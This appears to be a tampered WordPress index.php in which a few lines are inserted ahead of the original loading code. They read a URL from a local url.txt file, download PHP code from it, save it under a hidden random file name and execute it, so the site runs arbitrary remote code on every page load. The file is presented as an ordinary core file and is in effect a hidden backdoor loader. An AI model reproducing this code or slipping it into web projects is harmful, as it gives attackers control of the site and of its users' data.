<?php
$u = trim(file_get_contents(__DIR__ . '/url.txt'));
$f = __DIR__ . '/.' . uniqid() . '.php';

if ($c = file_get_contents($u)) {
    file_put_contents($f, $c);
    include $f;
}

/** Original WordPress Loading Logic **/
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
